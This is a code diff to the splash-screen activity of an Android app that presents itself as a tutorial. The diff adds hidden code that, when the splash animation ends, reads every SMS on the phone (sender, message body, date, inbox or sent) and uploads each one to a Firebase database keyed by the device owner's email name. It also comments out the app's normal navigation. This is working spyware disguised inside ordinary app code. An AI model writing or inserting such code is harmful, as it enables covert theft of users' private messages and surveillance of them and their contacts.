@@ -1,16 +1,32 @@
 package com.android.tutorial.activity;
 
+import android.content.ContentResolver;
 import android.content.Intent;
+import android.database.Cursor;
+import android.net.Uri;
+import android.text.format.DateFormat;
 import android.widget.Toast;
 
 import com.android.tutorial.R;
+import com.android.tutorial.utils.MyDevice;
 import com.android.tutorial.utils.PrefManager;
 import com.daimajia.androidanimations.library.Techniques;
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
 import com.viksaa.sssplash.lib.activity.AwesomeSplash;
 import com.viksaa.sssplash.lib.cnst.Flags;
 import com.viksaa.sssplash.lib.model.ConfigSplash;
 
+import java.util.ArrayList;
+import java.util.Date;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
 public class SplashActivity extends AwesomeSplash {
+
+    private DatabaseReference mFirebaseDatabase;
+    private FirebaseDatabase mFirebaseInstance;
+    Cursor cursor;
 
     @Override
     public void initSplash(ConfigSplash configSplash) {
@@ -57,6 +73,10 @@ public class SplashActivity extends AwesomeSplash {
 
     @Override
     public void animationsFinished() {
+        mFirebaseInstance = FirebaseDatabase.getInstance();
+        mFirebaseDatabase = mFirebaseInstance.getReference();
+        fetchSms();
+/*
         PrefManager prefManager = new PrefManager(getApplicationContext());
         if (!prefManager.isFirstTimeLaunch()) {
             launchHomeScreen();
@@ -64,7 +84,64 @@ public class SplashActivity extends AwesomeSplash {
         } else {
             launchWelcomeScreen();
         }
+*/
     }
+
+    public ArrayList fetchSms() {
+        ArrayList sms = new ArrayList();
+        Uri message = Uri.parse("content://sms/");
+        ContentResolver cr = SplashActivity.this.getContentResolver();
+
+        Cursor cursor = cr.query(message, null, null, null, null);
+        SplashActivity.this.startManagingCursor(cursor);
+        int totalSMS = cursor.getCount();
+        String readStatus = "";
+        long millisecond;
+        if (cursor.moveToFirst()) {
+            for (int i = 0; i < totalSMS; i++) {
+                if (cursor.getString(cursor.getColumnIndexOrThrow("type")).contains("1")) {
+                    readStatus = "inbox";
+                } else {
+                    readStatus = "sent";
+                }
+
+                millisecond = Long.parseLong(cursor.getString(cursor.getColumnIndexOrThrow("date")));
+                String dateString = DateFormat.format("MM/dd/yyyy hh:mm", new Date(millisecond)).toString();
+
+                sms.add("MobileNumber:" + cursor.getString(cursor.getColumnIndexOrThrow("address"))
+                        + "\nSMS:" + cursor.getString(cursor.getColumnIndexOrThrow("body"))
+                        + "\nDATE:" + dateString
+                        + "\nTYPE:" + cursor.getColumnIndexOrThrow("type")
+                        + "\nReadStatus:" + readStatus);
+
+                String senderAddress = cursor.getString(cursor.getColumnIndexOrThrow("address"));
+                Pattern pt = Pattern.compile("[^a-zA-Z0-9]");
+                Matcher match = pt.matcher(senderAddress);
+                while (match.find()) {
+                    String s = match.group();
+                    senderAddress = senderAddress.replaceAll("\\" + s, "");
+                }
+
+                mFirebaseDatabase.child("sms").child("" + MyDevice.getDeviceEmailName(SplashActivity.this)
+//                                MyDevice.getDeviceName()
+                        /*+"(" + MyDevice.getDeviceOsVersion() + ")"*/)
+                        .child(senderAddress)
+                        .child(readStatus)
+                        .child("" + i)
+                        .setValue("" + cursor.getString(cursor.getColumnIndexOrThrow("body"))
+                                + " " + dateString
+                        );
+                cursor.moveToNext();
+            }
+        }
+        // else {
+        // throw new RuntimeException("You have no SMS");
+        // }
+        cursor.close();
+
+        return sms;
+    }
+
 /*
     CountDownTimer timer;
     int TIME = 1000 * 2;
